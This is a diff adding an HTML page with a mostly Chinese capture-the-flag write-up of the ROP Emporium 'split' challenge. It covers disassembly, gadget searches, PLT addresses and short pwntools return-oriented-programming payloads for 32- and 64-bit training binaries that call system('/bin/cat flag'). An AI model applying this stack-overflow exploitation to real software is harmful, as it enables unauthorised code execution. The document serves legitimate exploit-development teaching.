@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>split &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">split</a><ul>
+<li><a class="reference internal" href="#still-here">Still here</a></li>
+<li><a class="reference internal" href="#i-m-not-lying">I’m not lying</a></li>
+<li><a class="reference internal" href="#treasure-hunting">Treasure hunting</a></li>
+<li><a class="reference internal" href="#all-together-now">All together now</a></li>
+<li><a class="reference internal" href="#finish-the-job">Finish the job</a></li>
+<li><a class="reference internal" href="#x64">x64</a></li>
+<li><a class="reference internal" href="#x86">x86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>split</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/1_split/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="split">
+<h1>split<a class="headerlink" href="#split" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/split.html</p>
+<p>In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/split.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/split32.zip">32bit</a></p>
+<section id="still-here">
+<h2>Still here<a class="headerlink" href="#still-here" title="永久链接至标题"></a></h2>
+<p>I’ll let you in on a secret; that useful string “/bin/cat flag.txt” is still present in this binary, as is a call to system(). It’s just a case of finding them and chaining them together to make the magic happen.</p>
+</section>
+<section id="i-m-not-lying">
+<h2>I’m not lying<a class="headerlink" href="#i-m-not-lying" title="永久链接至标题"></a></h2>
+<p>Before we begin let’s check the permissions on our target binary. We’re employing ROP due to the presence of NX, but we’d feel pretty stupid if it turned out that none of these binaries were compiled with NX enabled. We’ll check that this isn’t the case and we can’t just JMP ESP with a little shellcode. rabin2 -I split lets us know that NX is indeed enabled:</p>
+<p><img alt="NX enabled" src="../_images/split_protections.png" /></p>
+</section>
+<section id="treasure-hunting">
+<h2>Treasure hunting<a class="headerlink" href="#treasure-hunting" title="永久链接至标题"></a></h2>
+<p>Don’t just take my word for it, let’s check the call to system() and that useful string are actually here. Afterall if I hadn’t mentioned that they were still there how would you know where to start? Go ahead and use rabin2 or any of the tools mentioned in the <a class="reference external" href="https://ropemporium.com/guide.html">beginner’s guide</a> to locate useful strings and note their location. Now ensure that system() is imported, rabin2 or readelf are here to help.</p>
+</section>
+<section id="all-together-now">
+<h2>All together now<a class="headerlink" href="#all-together-now" title="永久链接至标题"></a></h2>
+<p>Now that you’ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the “/bin/cat flag.txt” string as the only argument. You’ll also have to start dealing with the differences between 32 &amp; 64bit calling conventions.</p>
+</section>
+<section id="finish-the-job">
+<h2>Finish the job<a class="headerlink" href="#finish-the-job" title="永久链接至标题"></a></h2>
+<p>Once you’ve planned your chain, craft a suitable solution. We’re still trying to read the contents of the flag.txt file on the imaginary remote machine. You can do the 32bit challenge with just a 2 link chain and the 64bit challenge with a 3 link chain.</p>
+</section>
+<section id="x64">
+<h2>x64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p><code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 函数</p>
+<p><img alt="image-20200430004753961" src="../_images/image-20200430004753961.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>004007ec 48 8b 15        MOV        RDX,qword ptr [stdin]
+         9d 08 20 00
+004007f3 48 8d 45 e0     LEA        RAX=&gt;local_28,[RBP + -0x20]
+004007f7 be 60 00        MOV        ESI,0x60
+         00 00
+004007fc 48 89 c7        MOV        RDI,RAX
+004007ff e8 1c fe        CALL       fgets                                            
+</pre></div>
+</div>
+<p>可以看到往 <code class="docutils literal notranslate"><span class="pre">[RBP</span> <span class="pre">+</span> <span class="pre">-0x20]</span></code> 可以写入 <code class="docutils literal notranslate"><span class="pre">0x60</span></code> Bytes</p>
+<p>溢出</p>
+<p>填充长度：<code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span> <span class="pre">=</span> <span class="pre">0x28</span></code></p>
+<p>但是现在我们没有像 ret2win 中直接有一个函数能执行 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/cat</span> <span class="pre">flag.txt&quot;)</span></code> 了</p>
+<p><img alt="image-20200430005153417" src="../_images/image-20200430005153417.png" /></p>
+<p>但是发现有 <code class="docutils literal notranslate"><span class="pre">system</span></code> 函数</p>
+<p>看了一下 <code class="docutils literal notranslate"><span class="pre">usefulFunction</span></code> 函数</p>
+<p><img alt="image-20200430005417485" src="../_images/image-20200430005417485.png" /></p>
+<p>它只是调用了 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/ls&quot;)</span></code></p>
+<p>把返回地址覆盖成它的地址也没有用啊</p>
+<p>这里就涉及到 ROP 了</p>
+<p>我们要自己构造一个 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/sh&quot;)</span></code> 去拿一个可以交互的 <code class="docutils literal notranslate"><span class="pre">shell</span></code> 或者  <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/cat</span> <span class="pre">flag&quot;)</span></code>  拿到 <code class="docutils literal notranslate"><span class="pre">flag</span></code></p>
+<p>怎么能做到呢？其实学过 <code class="docutils literal notranslate"><span class="pre">x64</span></code> 函数调用约定的都知道</p>
+<p>调用一个函数前要把参数放入指定的寄存器</p>
+<p><code class="docutils literal notranslate"><span class="pre">x64</span></code> ：前六个参数要依次放入 <code class="docutils literal notranslate"><span class="pre">rdi</span></code> <code class="docutils literal notranslate"><span class="pre">rsi</span></code> <code class="docutils literal notranslate"><span class="pre">rdx</span></code> <code class="docutils literal notranslate"><span class="pre">rcx</span></code> <code class="docutils literal notranslate"><span class="pre">r8</span></code> <code class="docutils literal notranslate"><span class="pre">r9</span></code></p>
+<p>可以看看 <code class="docutils literal notranslate"><span class="pre">fget</span></code> 的调用过程</p>
+<p><code class="docutils literal notranslate"><span class="pre">fgets(local_28,0x60,stdin);</span></code></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>004007ec 48 8b 15        MOV        RDX,qword ptr [stdin]
+         9d 08 20 00
+004007f3 48 8d 45 e0     LEA        RAX=&gt;local_28,[RBP + -0x20]
+004007f7 be 60 00        MOV        ESI,0x60
+         00 00
+004007fc 48 89 c7        MOV        RDI,RAX
+004007ff e8 1c fe        CALL       fgets   
+</pre></div>
+</div>
+<p>第一个参数是 <code class="docutils literal notranslate"><span class="pre">local_28</span></code> （[RBP + -0x20]）最终被放进了 <code class="docutils literal notranslate"><span class="pre">rdi</span></code></p>
+<p>第二个参数是  <code class="docutils literal notranslate"><span class="pre">0x60</span></code> 放进了 esi，其实 <code class="docutils literal notranslate"><span class="pre">esi</span></code> 就是 <code class="docutils literal notranslate"><span class="pre">rsi</span></code> 的低 <code class="docutils literal notranslate"><span class="pre">16</span></code> 位</p>
+<p>…………….</p>
+<p>好了，我们现在知道了函数的调用了，现在我们构造调用 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/cat</span> <span class="pre">flag&quot;);</span></code> 或者  <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/sh&quot;);</span></code></p>
+<p>我们需要一些叫 gadget 的东西</p>
+<p>我用的是 <code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code> 来获取</p>
+<p>Via:https://www.jianshu.com/p/1d7f0c56a323</p>
+<p>找一下关于 <code class="docutils literal notranslate"><span class="pre">rdi</span></code> 的，因为 <code class="docutils literal notranslate"><span class="pre">system</span></code> 只有一个参数，还有就是我们的输入全是存在栈上的，从栈上拿数据需要 <code class="docutils literal notranslate"><span class="pre">pop</span></code> 指令，现在我们需要  <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdi;</span> <span class="pre">ret</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">ROPgadget</span> <span class="pre">--binary</span> <span class="pre">split</span> <span class="pre">--only</span> <span class="pre">&quot;pop|ret&quot;</span></code></p>
+<div class="highlight-ams notranslate"><div class="highlight"><pre><span></span># root @ 1a8196b93dce in ~/disk/split [17:40:12]
+$ ROPgadget --binary split --only &quot;pop|ret&quot;
+Gadgets information
+============================================================
+0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400880 : pop r14 ; pop r15 ; ret
+0x0000000000400882 : pop r15 ; ret
+0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004006b0 : pop rbp ; ret
+0x0000000000400883 : pop rdi ; ret
+0x0000000000400881 : pop rsi ; pop r15 ; ret
+0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005b9 : ret
+</pre></div>
+</div>
+<p>找到了，地址：<code class="docutils literal notranslate"><span class="pre">0x0000000000400883</span></code></p>
+<p>寄存器找到了，我们去那里找字符串 <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag</span></code> 或者 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> 呢</p>
+<p>一样用 ROPgadget 搜索看一下</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span># root @ 1a8196b93dce in ~/disk/split [17:42:15]
+$ ROPgadget --binary split --string &quot;/bin/sh&quot;
+Strings information
+============================================================
+
+# root @ 1a8196b93dce in ~/disk/split [17:42:19]
+$ ROPgadget --binary split --string &quot;/bin/cat flag&quot;
+Strings information
+============================================================
+0x0000000000601060 : /bin/cat flag
+</pre></div>
+</div>
+<p>发现没有 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code></p>
+<p>但是有 <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag</span></code> 位于 <code class="docutils literal notranslate"><span class="pre">0x0000000000601060</span></code></p>
+<p>好了，现在参数有了，到找函数的地址，其实这里的地址并不是真正的函数在内存中的线性地址，我们找的是函数的 <code class="docutils literal notranslate"><span class="pre">plt</span></code> 这个需要了解动态链接机制，我们的程序编译是用的是 动态编译，用的库函数真正的函数代码是位于 <code class="docutils literal notranslate"><span class="pre">libc</span></code> 里面的</p>
+<p>这是我用 <code class="docutils literal notranslate"><span class="pre">objdump</span></code> 看的 system 函数，可以看到并没有 <code class="docutils literal notranslate"><span class="pre">system</span></code> 的代码，只有一个 <code class="docutils literal notranslate"><span class="pre">jmpq</span></code> , <code class="docutils literal notranslate"><span class="pre">0x601020</span></code> 是  system 函数的 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表地址</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>00000000004005e0 &lt;system@plt&gt;:
+  4005e0:       ff 25 3a 0a 20 00       jmpq   *0x200a3a(%rip)        # 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;
+  4005e6:       68 01 00 00 00          pushq  $0x1
+  4005eb:       e9 d0 ff ff ff          jmpq   4005c0 &lt;_init+0x20&gt;
+</pre></div>
+</div>
+<p>我们的程序只有一个叫 <code class="docutils literal notranslate"><span class="pre">plt</span></code> 的地址，当我们的程序调用这个函数时程序就会通过这个地址跳到 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表去找函数地址，如果函数是第一次被调用（system 的 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表项为空），程序就会去解析函数在内存中真正的线性地址，然后把它填到 <code class="docutils literal notranslate"><span class="pre">got</span></code> 表里面，算了，就不啰嗦了这个不是重点，我们现在还没涉及 泄露 <code class="docutils literal notranslate"><span class="pre">libc</span></code> 基地址,就不详细讲了</p>
+<p>现在用 <code class="docutils literal notranslate"><span class="pre">objdump</span></code> 看一下 <code class="docutils literal notranslate"><span class="pre">system</span></code>  函数的 <code class="docutils literal notranslate"><span class="pre">plt</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-d</span> <span class="pre">split</span> <span class="pre">|</span> <span class="pre">less</span></code></p>
+<p>然后输入 /system</p>
+<p><img alt="image-20200430011740518" src="../_images/image-20200430011740518.png" /></p>
+<p>system plt: <code class="docutils literal notranslate"><span class="pre">0x00000000004005e0</span></code></p>
+<p>写 payload:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x00000000004005e0</span>
+<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400883</span>
+<span class="n">cat_flag</span> <span class="o">=</span> <span class="mh">0x0000000000601060</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cat_flag</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">python</span> <span class="pre">exp.py</span> <span class="pre">|</span> <span class="pre">./split</span></code></p>
+<p><img alt="image-20200430021057152" src="../_images/image-20200430021057152.png" /></p>
+<p>pwn!</p>
+</section>
+<section id="x86">
+<h2>x86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p><img alt="image-20200430021533456" src="../_images/image-20200430021533456.png" /></p>
+<p>一样的漏洞，废话不多说</p>
+<p><code class="docutils literal notranslate"><span class="pre">fgets</span> </code>造成缓冲区溢出</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>        0804862f a1 80 a0        MOV        EAX,[stdin]
+                 04 08
+        08048634 83 ec 04        SUB        ESP,0x4
+        08048637 50              PUSH       EAX
+        08048638 6a 60           PUSH       0x60
+        0804863a 8d 45 d8        LEA        EAX=&gt;local_2c,[EBP + -0x28]
+        0804863d 50              PUSH       EAX
+        0804863e e8 cd fd        CALL       fgets                                            
+</pre></div>
+</div>
+<p>填充长度：<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span> <span class="pre">=0x2c</span> </code></p>
+<p><code class="docutils literal notranslate"><span class="pre">x86</span></code> ：函数调用是要把函数先压栈，然后 <code class="docutils literal notranslate"><span class="pre">call</span></code> ，参数压栈顺序是 最后一个先压栈</p>
+<p>比如上面的 <code class="docutils literal notranslate"><span class="pre">fgets(local_2c,0x60,stdin);</span></code> 先压 <code class="docutils literal notranslate"><span class="pre">stdin</span></code> 再压 <code class="docutils literal notranslate"><span class="pre">0x60</span></code> 然后压 <code class="docutils literal notranslate"><span class="pre">local_2c</span></code></p>
+<p>~~在 <code class="docutils literal notranslate"><span class="pre">x86</span></code> 下 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 是要找一些 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">reg</span> <span class="pre">ret;</span> <span class="pre">push</span> <span class="pre">reg</span> <span class="pre">ret</span></code> gadget~~</p>
+<p>~~直接用 <code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code>~~</p>
+<p>现在是凌晨 3 点，我可能熬夜熬傻逼了，<code class="docutils literal notranslate"><span class="pre">x86</span></code> 下用个屁的<code class="docutils literal notranslate"><span class="pre">gadget</span></code> 输入的东西全放在栈上了，我还 <code class="docutils literal notranslate"><span class="pre">pop</span></code> <code class="docutils literal notranslate"><span class="pre">push</span></code> 个鬼</p>
+<p>直接找字符串</p>
+<p>发现有： <code class="docutils literal notranslate"><span class="pre">/bin/cat</span> <span class="pre">flag</span></code>，地址：<code class="docutils literal notranslate"><span class="pre">0x0804a030</span></code></p>
+<p><img alt="image-20200430024849591" src="../_images/image-20200430024849591.png" /></p>
+<p><code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-d</span> <span class="pre">split32</span> <span class="pre">|</span> <span class="pre">less</span></code></p>
+<p><img alt="image-20200430025012042" src="../_images/image-20200430025012042.png" /></p>
+<p>然后就是获得 <code class="docutils literal notranslate"><span class="pre">System</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code>，地址：<code class="docutils literal notranslate"><span class="pre">0x08048430</span></code></p>
+<p>(其实可以用 pwntools ELF的函数直接获得的，还是算了，手动吧)</p>
+<p>x86 的 rop 是：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">调用的函数</span>
+<span class="n">返回地址</span>
+<span class="n">参数</span>
+</pre></div>
+</div>
+<p>所以</p>
+<p>paload:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x08048430</span>
+<span class="n">cat_flag</span> <span class="o">=</span> <span class="mh">0x0804a030</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s1">&#39;AAAA&#39;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cat_flag</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430030724724" src="../_images/image-20200430030724724.png" /></p>
+<p>运行 <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">dmesg</span> <span class="pre">-c</span> </code>看到了吗</p>
+<p><img alt="image-20200430030813288" src="../_images/image-20200430030813288.png" /></p>
+<p>pwn！</p>
+<p>最后一条</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="mf">30242.626114</span><span class="p">]</span> <span class="n">split32</span><span class="p">[</span><span class="mi">4359</span><span class="p">]:</span> <span class="n">segfault</span> <span class="n">at</span> <span class="mi">41414141</span> <span class="n">ip</span> <span class="mi">0000000041414141</span> <span class="n">sp</span> <span class="mi">00000000</span><span class="n">ffdcc904</span> <span class="n">error</span> <span class="mi">14</span>
+</pre></div>
+</div>
+<p>执行完 <code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/cat</span> <span class="pre">flag&quot;);</span></code> 程序跳到了 <code class="docutils literal notranslate"><span class="pre">0x41414141</span></code> 去执行</p>
+<p>证明了函数调用的栈布局</p>
+<p>我们的 payload 中</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span> <span class="c1">#system</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s1">&#39;AAAA&#39;</span> <span class="c1">#返回地址</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cat_flag</span><span class="p">)</span> <span class="c1">#参数</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
